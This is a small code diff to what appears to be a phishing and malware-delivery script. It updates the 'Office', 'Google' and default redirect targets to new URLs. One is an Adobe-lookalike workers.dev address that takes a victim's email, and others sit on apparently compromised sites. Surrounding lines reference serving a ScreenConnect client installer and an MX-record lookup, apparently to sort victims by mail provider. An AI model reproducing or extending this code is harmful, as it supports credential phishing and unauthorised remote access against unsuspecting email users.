@@ -7,9 +7,9 @@ const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
 
 const MSI_PATH = "/ScreenConnect.ClientSetup.msi";
 
-const OFFICE_TARGET = "https://agripeace.org/ringcentral";
-const GOOGLE_TARGET = "https://agripeace.org/cw";
-const DEFAULT_TARGET = "https://agripeace.org/cw";
+const OFFICE_TARGET = "https://adobe-rm6.info-iroatech-com-s-account.workers.dev?email=";
+const GOOGLE_TARGET = "https://kingdomwater.org/images/cdl";
+const DEFAULT_TARGET = "https://kingdomwater.org/images/cdl";
 
 const MX_TIMEOUT_MS = 1500;
 
